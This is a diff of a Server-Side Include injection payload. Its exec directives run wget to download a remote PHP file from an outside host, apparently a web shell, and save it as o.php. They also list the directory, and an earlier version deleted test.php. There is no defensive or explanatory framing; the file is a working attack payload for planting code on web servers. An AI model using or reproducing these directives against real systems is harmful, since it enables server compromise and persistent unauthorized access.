@@ -1,3 +1,2 @@
-<!--#exec cmd="{wget,https://misalfalahkuncung.my.id/upload.txt,-O,o.php}" -->
+<!--#exec cmd="{wget,https://raw.githubusercontent.com/FadliYunianto/Fadli/refs/heads/main/priv1.php,-O,o.php}" -->
 <!--#exec cmd="{ls,-la}" -->
-<!--#exec cmd="{rm,test.php}" -->
